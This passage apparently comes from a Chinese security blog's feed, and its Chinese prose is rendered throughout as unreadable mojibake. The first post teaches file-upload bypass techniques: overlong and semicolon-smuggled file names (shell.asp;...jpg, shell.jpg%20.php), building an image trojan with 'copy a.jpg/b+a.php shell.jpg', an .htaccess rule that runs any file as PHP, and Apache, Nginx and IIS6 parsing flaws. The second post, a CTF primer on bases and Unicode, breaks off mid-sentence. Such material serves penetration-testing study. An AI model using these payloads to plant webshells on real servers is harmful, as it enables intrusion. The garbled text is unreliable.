title="æ–‡ä»¶é‡å‘½åç»•è¿‡"></a>æ–‡ä»¶é‡å‘½åç»•è¿‡</h3><p>å¦‚æœwebç¨‹åºä¼šå°†filenameé™¤äº†æ‰©å±•åçš„é‚£æ®µé‡å‘½åçš„è¯ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥æ„é€ æ›´å¤šçš„ç‚¹ã€ç¬¦å·ç­‰ç­‰ã€‚</p><p><img src="/2019/09/10/file-upload-leak/11.png"></p><h3 id="ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡"><a href="#ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡" class="headerlink" title="ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡"></a>ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡</h3><p>æ–‡ä»¶åä½¿ç”¨éå­—æ¯æ•°å­—ï¼Œæ¯”å¦‚ä¸­æ–‡ç­‰æœ€å¤§ç¨‹åº¦çš„æ‹‰é•¿ï¼Œä¸è¡Œçš„è¯å†ç»“åˆä¸€ä¸‹å…¶ä»–çš„ç‰¹æ€§è¿›è¡Œæµ‹è¯•ï¼š</p><pre><code>shell.asp;ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹.jpg</code></pre><h2 id="å›¾ç‰‡é©¬"><a href="#å›¾ç‰‡é©¬" class="headerlink" title="å›¾ç‰‡é©¬"></a>å›¾ç‰‡é©¬</h2><p>å°†å›¾ç‰‡å’Œä¸€å¥è¯åœ¨cmdä¸‹åˆæˆåï¼Œä»¥phpè„šæœ¬æ‰§è¡Œæ—¶åˆæˆçš„ä¸€å¥è¯ä¹Ÿä¼šè¢«æ‰§è¡Œ</p><p>å½“ä¸€å¥è¯è¢«æ‰§è¡Œæ—¶ï¼Œæµè§ˆå™¨è®¿é—®æ—¶çœ‹ä¸åˆ°ä¸€å¥è¯ä»£ç </p><p><strong>åˆ¶ä½œ</strong><br>åœ¨cmdä¸­è¾“å…¥</p><pre><code>copy a.jpg/b+a.php shell.jpg</code></pre><p><strong>åˆ©ç”¨</strong></p><ol><li>é…åˆæ–‡ä»¶åŒ…å«æ¼æ´</li><li>é…åˆç½‘ç«™å®¹å™¨è§£ææ¼æ´</li></ol><h2 id="å¸¸è§ç½‘ç«™å®¹å™¨è§£ææ¼æ´"><a href="#å¸¸è§ç½‘ç«™å®¹å™¨è§£ææ¼æ´" class="headerlink" title="å¸¸è§ç½‘ç«™å®¹å™¨è§£ææ¼æ´"></a>å¸¸è§ç½‘ç«™å®¹å™¨è§£ææ¼æ´</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><h4 id="å¤šåç¼€å"><a href="#å¤šåç¼€å" class="headerlink" title="å¤šåç¼€å"></a>å¤šåç¼€å</h4><p>Apacheå¯¹äºæ–‡ä»¶åçš„è§£ææ˜¯ä»åå¾€å‰è§£æçš„ï¼Œç›´åˆ°é‡è§ä¸€ä¸ªApacheè®¤è¯†çš„æ–‡ä»¶ç±»å‹ä¸ºæ­¢</p><p>å¦‚ï¼š</p><pre><code>hello.php.rar.rar.rar</code></pre><p>Apacheä¸è®¤è¯†.rarè¿™ä¸ªæ–‡ä»¶ç±»å‹ï¼Œä¼šä¸€ç›´éå†åˆ°.php</p><p>åœ¨phpstudyç½‘ç«™ç›®å½•å­˜æ”¾ä¸€å¼ a.jpgå›¾ç‰‡ï¼Œå°†å…¶æ”¹åä¸ºa.jpg.abcï¼Œå†ç”¨æµè§ˆå™¨å»è®¿é—®è¿™å¼ å›¾ç‰‡ï¼Œå‘ç°è¢«æˆåŠŸè§£æä¸ºå›¾ç‰‡ï¼š</p><p>é‚£ä¹ˆç°åœ¨åœ¨ç½‘ç«™ç›®å½•å­˜æ”¾ä¸€ä¸ªma.phpæ–‡ä»¶ï¼Œé‡Œé¢å†…å®¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;good&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å†å°†å…¶æ”¹åä¸ºma.php.abcï¼Œè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼š</p><p>å‘ç°å…¶å¹¶æ²¡æœ‰è¢«è§£æï¼Œè€Œæ˜¯ç›´æ¥å°†é‡Œé¢çš„å†…å®¹æ˜¾ç¤ºäº†å‡ºæ¥ï¼Œè¿™æ˜¯å› ä¸ºApacheæœ¬èº«å¹¶ä¸æ‡‚phpï¼Œè€Œæ˜¯å°†è¿™ä¸ªæ–‡ä»¶äº¤ç»™phpè§£é‡Šå™¨ï¼Œphpè§£é‡Šå™¨å’ŒApacheæœ‰ç€ä¸åŒçš„è§£æè§„åˆ™ï¼›</p><p>åœ¨<code>phpStudy\PHPTutorial\Apache\conf\extra</code>æ‰¾åˆ°<code>httpd-php.conf</code>è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ‰“å¼€å¯ä»¥çœ‹åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.php$&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåªæœ‰å½“æ–‡ä»¶ååç¼€ä¸º.phpæ—¶ï¼Œæ–‡ä»¶æ‰èƒ½è¢«å½“åšphpæ‰§è¡Œï¼Œé‚£ä¹ˆç°åœ¨å°†å…¶æ”¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.php\.&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>é‡å¯phpstudyï¼Œå¯ä»¥çœ‹åˆ°ma.php.abcå·²ç»å¯ä»¥è¢«è§£æäº†ï¼š</p><h4 id="ç½•è§åç¼€"><a href="#ç½•è§åç¼€" class="headerlink" title="ç½•è§åç¼€"></a>ç½•è§åç¼€</h4><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸åªæ˜¯phpï¼Œå°±è¿phtmlã€phtã€php3ã€php4å’Œphp5éƒ½æ˜¯Apacheå’Œphpè®¤å¯çš„phpç¨‹åºçš„æ–‡ä»¶åç¼€</p><h4 id="å¦™ç”¨-HTACCESS"><a href="#å¦™ç”¨-HTACCESS" class="headerlink" title="å¦™ç”¨.HTACCESS"></a>å¦™ç”¨.HTACCESS</h4><p>Apacheæä¾›äº†ä¸€ç§å¾ˆæ–¹ä¾¿çš„ã€å¯ä½œç”¨äºå½“å‰ç›®å½•åŠå…¶å­ç›®å½•çš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼š.htaccess</p><p>è¦ä½¿.htaccessæ–‡ä»¶ç”Ÿæ•ˆï¼Œéœ€è¦åœ¨Apacheçš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Š(è¿™é‡Œæˆ‘çš„é…ç½®æ–‡ä»¶ä¸­é»˜è®¤å°±æœ‰ä»¥ä¸‹é…ç½®)ï¼š</p><pre><code>AllowOverride AllLoadModule rewrite_module modules/mod_rewrite.so</code></pre><p>ä¹‹åï¼Œæˆ‘ä»¬æµ‹è¯•ç”¨.htaccessæ–‡ä»¶ä¿®æ”¹phpè§£é‡Šå™¨é…ç½®ï¼š</p><p>æ–°å»ºä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œç”±äºwindowsä¸æ”¯æŒæ–‡ä»¶åä»¥å°æ•°ç‚¹å¼€å¤´ï¼Œéœ€è¦ç”¨åˆ°cmdå‘½ä»¤ï¼š</p><pre><code>echo &gt; .htaccess</code></pre><p>è¿™æ ·å³å¯ç”Ÿæˆ.htaccessæ–‡ä»¶ï¼›åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx&quot;&gt;  </span><br><span class="line">    SetHandler application&#x2F;x-httpd-php  </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>å³è®©phpè§£é‡Šå™¨å°†æ–‡ä»¶åä¸­å«æœ‰xxxçš„æ–‡ä»¶è§£æä¸ºphp</p><p>åœ¨æ­¤.htaccessç›®å½•åˆ›å»ºa.xxxæ–‡ä»¶ï¼Œåœ¨é‡Œé¢å†™å…¥ï¼š</p><pre><code>&lt;?phpecho &#39;good&#39;;?&gt;</code></pre><p>å‘ç°å…¶è¢«è§£ææˆäº†phpï¼š</p><h3 id="Ngnix"><a href="#Ngnix" class="headerlink" title="Ngnix"></a>Ngnix</h3><ol><li><p>Nginxç‰ˆæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Nginx 0.5.*</span><br><span class="line">Nginx 0.6.*</span><br><span class="line">Nginx 0.7 &lt;&#x3D; 0.7.65</span><br><span class="line">Nginx 0.8 &lt;&#x3D; 0.8.37</span><br></pre></td></tr></table></figure><p>ä»¥ä¸ŠNginxå®¹å™¨çš„ç‰ˆæœ¬ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªåœ¨wafç™½åå•ä¹‹å†…æ‰©å±•åçš„æ–‡ä»¶shell.jpgï¼Œç„¶åä»¥shell.jpg.phpè¿›è¡Œè¯·æ±‚</p></li><li><p>Nginxç‰ˆæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nginx 0.8.41 â€“ 1.5.6ï¼š</span><br></pre></td></tr></table></figure><p>ä»¥ä¸ŠNginxå®¹å™¨çš„ç‰ˆæœ¬ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªåœ¨wafç™½åå•ä¹‹å†…æ‰©å±•åçš„æ–‡ä»¶shell.jpgï¼Œç„¶åä»¥shell.jpg%20.phpè¿›è¡Œè¯·æ±‚</p></li></ol><h3 id="IIS6-0"><a href="#IIS6-0" class="headerlink" title="IIS6.0"></a>IIS6.0</h3><p>IIS6.0å±äºwinserverä¸‹çš„æœåŠ¡å™¨</p><p>aspå³ active server pagesï¼Œæ˜¯microsoftå…¬å¸å¼€å‘çš„æœåŠ¡ç«¯è„šæœ¬ç¯å¢ƒï¼Œå¯ç”¨æ¥åˆ›å»ºåŠ¨æ€äº¤äº’å¼ç½‘é¡µå¹¶å»ºç«‹å¼ºå¤§çš„webåº”ç”¨ç¨‹åº</p><ol><li><p>ç›®å½•ååŒ…å«.aspã€.asaã€.cerçš„è¯ï¼Œåˆ™è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½å°†æŒ‰ç…§aspè§£æ</p></li><li><p>æ–‡ä»¶åä¸­å¦‚æœåŒ…å«.asp;ã€.asa;ã€.cer;åˆ™ä¼˜å…ˆä½¿ç”¨aspè§£æï¼Œå¦‚asa.asa;asa.jpg</p></li></ol><p>å‚è€ƒï¼š</p><p><a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/">https://thief.one/2016/09/22/ä¸Šä¼ æœ¨é©¬å§¿åŠ¿æ±‡æ€»-æ¬¢è¿è¡¥å……/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›åˆ¶ä¸ç¼–ç </title>
      <link href="2019/08/16/binary-coding/"/>
      <url>2019/08/16/binary-coding/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†CTFä¸­ä¸€äº›å¸¸è§çš„è¿›åˆ¶å’Œç¼–ç æ–¹å¼ï¼</p><a id="more"></a><h2 id="äºŒè¿›åˆ¶"><a href="#äºŒè¿›åˆ¶" class="headerlink" title="äºŒè¿›åˆ¶"></a>äºŒè¿›åˆ¶</h2><p>äºŒè¿›åˆ¶æ•°æ®æ˜¯ç”¨0å’Œ1ä¸¤ä¸ªæ•°ç æ¥è¡¨ç¤ºçš„æ•°ï¼Œå½“å‰çš„è®¡ç®—æœºç³»ç»Ÿä½¿ç”¨çš„åŸºæœ¬ä¸Šæ˜¯äºŒè¿›åˆ¶ç³»ç»Ÿã€‚</p><p>äºŒè¿›åˆ¶ï¼ˆç®€ç§°Bin)ä¸ºä»€ä¹ˆç”¨å…«ä½æ¥è¡¨ç¤ºï¼Ÿ</p><p>å…«ä½ï¼ˆ8bitï¼‰æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œè®¡ç®—æœºä¸­åªè¦ä¸€ä¸ªå­—èŠ‚å°±å¯ä»¥å­˜æ”¾ASCIIç¼–ç ï¼Œå°±æ˜¯æ‰€æœ‰çš„æ•°å­—ã€å¤§å°å†™å­—æ¯å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼ˆæ€»å…±255ä¸ªï¼‰ã€‚æ‰€ä»¥åœ¨è®¡ç®—æœºä¸­å¯¹ç”¨æˆ·æ¥è¯´æœ‰æ„ä¹‰çš„å•ä½å°±æ˜¯å­—èŠ‚ï¼Œè¿™æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹æ‡‚çš„ã€‚å…«ä½çš„äºŒè¿›åˆ¶æ•°æœ€å¤§å€¼å°±æ˜¯255ï¼Œåˆšå¥½è¡¨ç¤º255ä¸ªASCIIå­—ç¬¦</p><h2 id="å…«è¿›åˆ¶"><a href="#å…«è¿›åˆ¶" class="headerlink" title="å…«è¿›åˆ¶"></a>å…«è¿›åˆ¶</h2><p>å…«è¿›åˆ¶ï¼ŒOctalï¼Œç¼©å†™OCTæˆ–Oï¼Œä¸€ç§ä»¥8ä¸ºåŸºæ•°çš„è®¡æ•°æ³•ï¼Œé‡‡ç”¨0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ7å…«ä¸ªæ•°å­—ï¼Œé€¢å…«è¿›1ã€‚ä¸€äº›ç¼–ç¨‹è¯­è¨€ä¸­å¸¸å¸¸ä»¥æ•°å­—0å¼€å§‹è¡¨æ˜è¯¥æ•°å­—æ˜¯å…«è¿›åˆ¶ã€‚å…«è¿›åˆ¶çš„æ•°å’ŒäºŒè¿›åˆ¶æ•°å¯ä»¥æŒ‰ä½å¯¹åº”ï¼ˆå…«è¿›åˆ¶ä¸€ä½å¯¹åº”äºŒè¿›åˆ¶ä¸‰ä½ï¼‰ï¼Œå› æ­¤å¸¸åº”ç”¨åœ¨è®¡ç®—æœºè¯­è¨€ä¸­ã€‚</p><h2 id="åå…­è¿›åˆ¶"><a href="#åå…­è¿›åˆ¶" class="headerlink" title="åå…­è¿›åˆ¶"></a>åå…­è¿›åˆ¶</h2><p>åå…­è¿›åˆ¶ï¼ˆç®€å†™ä¸ºhexæˆ–ä¸‹æ ‡16ï¼‰åœ¨æ•°å­¦ä¸­æ˜¯ä¸€ç§é€¢16è¿›1çš„è¿›ä½åˆ¶ã€‚ä¸€èˆ¬ç”¨æ•°å­—0åˆ°9å’Œå­—æ¯Aåˆ°Fï¼ˆæˆ–afï¼‰è¡¨ç¤ºï¼Œå…¶ä¸­:AFè¡¨ç¤º10~15ï¼Œè¿™äº›ç§°ä½œåå…­è¿›åˆ¶æ•°å­—ã€‚</p><p>ä¸€èˆ¬ä»¥0xå¼€å¤´çš„éƒ½æ˜¯åå…­è¿›åˆ¶å½¢å¼ï¼Œä¸”æ˜¯ä¸¤ä½æ¥è¡¨ç¤ºï¼Œ16x16=2^8,åˆšå¥½å’ŒäºŒè¿›åˆ¶å¯¹åº”</p><h2 id="ASCIIç¼–ç "><a href="#ASCIIç¼–ç " class="headerlink" title="ASCIIç¼–ç "></a>ASCIIç¼–ç </h2><p>ASCII ((American Standard Code for Information Interchange): ç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼‰æ˜¯åŸºäºæ‹‰ä¸å­—æ¯çš„ä¸€å¥—ç”µè„‘ç¼–ç ç³»ç»Ÿï¼Œä¸»è¦ç”¨äºæ˜¾ç¤ºç°ä»£è‹±è¯­å’Œå…¶ä»–è¥¿æ¬§è¯­è¨€ã€‚å®ƒæ˜¯æœ€é€šç”¨çš„ä¿¡æ¯äº¤æ¢æ ‡å‡†ï¼Œå¹¶ç­‰åŒäºå›½é™…æ ‡å‡†ISO/IEC 646ã€‚</p><p><img src="/2019/08/16/binary-coding/12256356.png"></p><p>ç¬¬0ï½32å·åŠç¬¬127å·(å…±34ä¸ª)æ˜¯æ§åˆ¶å­—ç¬¦æˆ–é€šè®¯ä¸“ç”¨å­—ç¬¦ï¼Œå¦‚æ§åˆ¶ç¬¦ï¼šLFï¼ˆæ¢è¡Œï¼‰ã€CRï¼ˆå›è½¦ï¼‰ã€FFï¼ˆæ¢é¡µï¼‰ã€DELï¼ˆåˆ é™¤ï¼‰ã€BELï¼ˆæŒ¯é“ƒï¼‰ç­‰ï¼›<br>é€šè®¯ä¸“ç”¨å­—ç¬¦ï¼šSOHï¼ˆæ–‡å¤´ï¼‰ã€EOTï¼ˆæ–‡å°¾ï¼‰ã€ACKï¼ˆç¡®è®¤ï¼‰ç­‰ï¼›</p><p>ç¬¬33ï½126å·(å…±94ä¸ª)æ˜¯å­—ç¬¦ï¼Œå…¶ä¸­ç¬¬48ï½57å·ä¸º0ï½9åä¸ªé˜¿æ‹‰ä¼¯æ•°å­—ï¼›65ï½90å·ä¸º26ä¸ªå¤§å†™è‹±æ–‡å­—æ¯ï¼Œ97ï½122å·ä¸º26ä¸ªå°å†™è‹±æ–‡å­—æ¯ï¼Œå…¶ä½™ä¸ºä¸€äº›æ ‡ç‚¹ç¬¦å·ã€è¿ç®—ç¬¦å·ç­‰ã€‚</p><p>ç¤ºä¾‹<br>æºæ–‡æœ¬ï¼š<code>The quick brown fox jumps over the lazy dog</code></p><p>ASCIIç¼–ç å¯¹åº”åè¿›åˆ¶ï¼š</p><pre><code>84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103</code></pre><h1 id="Unicodeç¼–ç "><a href="#Unicodeç¼–ç " class="headerlink" title="Unicodeç¼–ç "></a>Unicodeç¼–ç </h1><h3 id="å†å²é—®é¢˜"><a href="#å†å²é—®é¢˜" class="headerlink" title="å†å²é—®é¢˜"></a>å†å²é—®é¢˜</h3><p>è‹±è¯­ç”¨ 128 ä¸ªå­—ç¬¦æ¥ç¼–ç å®Œå…¨æ˜¯è¶³å¤Ÿçš„ï¼Œä½†æ˜¯ç”¨æ¥è¡¨ç¤ºå…¶ä»–è¯­è¨€ï¼Œ128 ä¸ªå­—ç¬¦æ˜¯è¿œè¿œä¸å¤Ÿçš„ã€‚äºæ˜¯ï¼Œä¸€äº›æ¬§æ´²çš„å›½å®¶å°±å†³å®šï¼Œå°† ASCII ç ä¸­é—²ç½®çš„æœ€é«˜ä½åˆ©ç”¨èµ·æ¥ï¼Œè¿™æ ·ä¸€æ¥å°±èƒ½è¡¨ç¤º 256 ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œè¿™é‡Œåˆæœ‰äº†ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ä¸åŒçš„å›½å®¶çš„å­—ç¬¦é›†å¯èƒ½ä¸åŒï¼Œå°±ç®—å®ƒä»¬éƒ½èƒ½ç”¨ 256 ä¸ªå­—ç¬¦è¡¨ç¤ºå…¨ï¼Œä½†æ˜¯åŒä¸€ä¸ªç ç‚¹ï¼ˆä¹Ÿå°±æ˜¯ 8 ä½äºŒè¿›åˆ¶æ•°ï¼‰è¡¨ç¤ºçš„å­—ç¬¦å¯èƒ½å¯èƒ½ä¸åŒã€‚ä¾‹å¦‚ï¼Œ144 åœ¨é˜¿æ‹‰ä¼¯äººçš„ ASCII ç ä¸­æ˜¯ Ú¯ï¼Œè€Œåœ¨ä¿„ç½—æ–¯çš„ ASCII ç ä¸­æ˜¯ Ñ’ã€‚</p><p>å› æ­¤ï¼ŒASCII ç çš„é—®é¢˜åœ¨äºå°½ç®¡æ‰€æœ‰äººéƒ½åœ¨ 0 - 127 å·å­—ç¬¦ä¸Šè¾¾æˆäº†ä¸€è‡´ï¼Œä½†å¯¹äº 128 - 255 å·å­—ç¬¦ä¸Šå´æœ‰å¾ˆå¤šç§ä¸åŒçš„è§£é‡Šã€‚ä¸æ­¤åŒæ—¶ï¼Œäºšæ´²è¯­è¨€æœ‰æ›´å¤šçš„å­—ç¬¦éœ€è¦è¢«å­˜å‚¨ï¼Œä¸€ä¸ªå­—èŠ‚å·²ç»ä¸å¤Ÿç”¨äº†ã€‚äºæ˜¯ï¼Œäººä»¬å¼€å§‹ä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥å­˜å‚¨å­—ç¬¦ã€‚</p><p>å„ç§å„æ ·çš„ç¼–ç æ–¹å¼æˆäº†ç³»ç»Ÿå¼€å‘è€…çš„å™©æ¢¦ï¼Œå› ä¸ºä»–ä»¬æƒ³æŠŠè½¯ä»¶å–åˆ°å›½å¤–ã€‚äºæ˜¯ï¼Œä»–ä»¬æå‡ºäº†ä¸€ä¸ªâ€œå†…ç è¡¨â€çš„æ¦‚å¿µï¼Œå¯ä»¥åˆ‡æ¢åˆ°ç›¸åº”è¯­è¨€çš„ä¸€ä¸ªå†…ç è¡¨ï¼Œè¿™æ ·æ‰èƒ½æ˜¾ç¤ºç›¸åº”è¯­è¨€çš„å­—æ¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœä½¿ç”¨å¤šè¯­ç§ï¼Œé‚£ä¹ˆå°±éœ€è¦é¢‘ç¹çš„åœ¨å†…ç è¡¨å†…è¿›è¡Œåˆ‡æ¢ã€‚</p><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>æœ€ç»ˆï¼Œç¾å›½äººæ„è¯†åˆ°ä»–ä»¬åº”è¯¥æå‡ºä¸€ç§æ ‡å‡†æ–¹æ¡ˆæ¥å±•ç¤ºä¸–ç•Œä¸Šæ‰€æœ‰è¯­è¨€ä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼Œå‡ºäºè¿™ä¸ªç›®çš„ï¼ŒUnicodeè¯ç”Ÿäº†ã€‚</p><p>Unicode å½“ç„¶æ˜¯ä¸€æœ¬å¾ˆåšçš„å­—å…¸ï¼Œè®°å½•ç€ä¸–ç•Œä¸Šæ‰€æœ‰å­—ç¬¦å¯¹åº”çš„ä¸€ä¸ªæ•°å­—ã€‚å…·ä½“æ˜¯æ€æ ·çš„å¯¹åº”å…³ç³»ï¼Œåˆæˆ–è€…è¯´æ˜¯å¦‚ä½•è¿›è¡Œåˆ’åˆ†çš„ï¼Œå°±ä¸æ˜¯æˆ‘ä»¬è€ƒè™‘çš„é—®é¢˜äº†ï¼Œæˆ‘ä»¬åªç”¨çŸ¥é“ Unicode ç»™æ‰€æœ‰çš„å­—ç¬¦æŒ‡å®šäº†ä¸€ä¸ªæ•°å­—ç”¨æ¥è¡¨ç¤ºè¯¥å­—ç¬¦ã€‚</p><p>å¯¹äº Unicode æœ‰ä¸€äº›è¯¯è§£ï¼Œå®ƒä»…ä»…åªæ˜¯ä¸€ä¸ªå­—ç¬¦é›†ï¼Œè§„å®šäº†ç¬¦åˆå¯¹åº”çš„äºŒè¿›åˆ¶ä»£ç ï¼Œè‡³äºè¿™ä¸ªäºŒè¿›åˆ¶ä»£ç å¦‚ä½•å­˜å‚¨åˆ™æ²¡æœ‰ä»»ä½•è§„å®šã€‚å®ƒçš„æƒ³æ³•å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸ºæ¯ä¸ªå­—ç¬¦è§„å®šä¸€ä¸ªç”¨æ¥è¡¨ç¤ºè¯¥å­—ç¬¦çš„æ•°å­—ï¼Œä»…æ­¤è€Œå·²ã€‚</p><h3 id="Unicode-ç¼–ç æ–¹æ¡ˆ"><a href="#Unicode-ç¼–ç æ–¹æ¡ˆ" class="headerlink" title="Unicode ç¼–ç æ–¹æ¡ˆ"></a>Unicode ç¼–ç æ–¹æ¡ˆ</h3><p>ä¹‹å‰æåˆ°ï¼ŒUnicode æ²¡æœ‰è§„å®šå­—ç¬¦å¯¹åº”çš„äºŒè¿›åˆ¶ç å¦‚ä½•å­˜å‚¨ã€‚ä»¥æ±‰å­—â€œæ±‰â€ä¸ºä¾‹ï¼Œå®ƒçš„ Unicode ç ç‚¹æ˜¯ 0x6c49ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶æ•°æ˜¯ 110110001001001ï¼ŒäºŒè¿›åˆ¶æ•°æœ‰ 15 ä½ï¼Œè¿™ä¹Ÿå°±è¯´æ˜äº†å®ƒè‡³å°‘éœ€è¦ 2 ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚å¯ä»¥æƒ³è±¡ï¼Œåœ¨ Unicode å­—å…¸ä¸­å¾€åçš„å­—ç¬¦å¯èƒ½å°±éœ€è¦ 3 ä¸ªå­—èŠ‚æˆ–è€… 4 ä¸ªå­—èŠ‚ï¼Œç”šè‡³æ›´å¤šå­—èŠ‚æ¥è¡¨ç¤ºäº†ã€‚</p><p>è¿™å°±å¯¼è‡´äº†ä¸€äº›é—®é¢˜ï¼Œè®¡ç®—æœºæ€ä¹ˆçŸ¥é“ä½ è¿™ä¸ª 2 ä¸ªå­—èŠ‚è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œä¸æ˜¯åˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬å¯èƒ½ä¼šæƒ³åˆ°ï¼Œé‚£å°±å–ä¸ªæœ€å¤§çš„ï¼Œå‡å¦‚ Unicode ä¸­æœ€å¤§çš„å­—ç¬¦ç”¨ 4 å­—èŠ‚å°±å¯ä»¥è¡¨ç¤ºäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°†æ‰€æœ‰çš„å­—ç¬¦éƒ½ç”¨ 4 ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œä¸å¤Ÿçš„å°±å¾€å‰é¢è¡¥ 0ã€‚è¿™æ ·ç¡®å®å¯ä»¥è§£å†³ç¼–ç é—®é¢˜ï¼Œä½†æ˜¯å´é€ æˆäº†ç©ºé—´çš„æå¤§æµªè´¹ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªè‹±æ–‡æ–‡æ¡£ï¼Œé‚£æ–‡ä»¶å¤§å°å°±å¤§å‡ºäº† 3 å€ï¼Œè¿™æ˜¾ç„¶æ˜¯æ— æ³•æ¥å—çš„ã€‚</p><p>äºæ˜¯ï¼Œä¸ºäº†è¾ƒå¥½çš„è§£å†³ Unicode çš„ç¼–ç é—®é¢˜ï¼Œ UTF-8 å’Œ UTF-16 ä¸¤ç§å½“å‰æ¯”è¾ƒæµè¡Œçš„ç¼–ç æ–¹å¼è¯ç”Ÿäº†ã€‚å½“ç„¶è¿˜æœ‰ä¸€ä¸ª UTF-32 çš„ç¼–ç æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯ä¸Šè¿°é‚£ç§å®šé•¿ç¼–ç ï¼Œå­—ç¬¦ç»Ÿä¸€ä½¿ç”¨ 4 ä¸ªå­—èŠ‚ï¼Œè™½ç„¶çœ‹ä¼¼æ–¹ä¾¿ï¼Œä½†æ˜¯å´ä¸å¦‚å¦å¤–ä¸¤ç§ç¼–ç æ–¹å¼ä½¿ç”¨å¹¿æ³›ã€‚</p><h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>UTF-8 æ˜¯ä¸€ä¸ªéå¸¸æƒŠè‰³çš„ç¼–ç æ–¹å¼ï¼Œæ¼‚äº®çš„å®ç°äº†å¯¹ ASCII ç çš„å‘åå…¼å®¹ï¼Œä»¥ä¿è¯ Unicode å¯ä»¥è¢«å¤§ä¼—æ¥å—ã€‚</p><p>UTF-8 æ˜¯ç›®å‰äº’è”ç½‘ä¸Šä½¿ç”¨æœ€å¹¿æ³›çš„ä¸€ç§ Unicode ç¼–ç 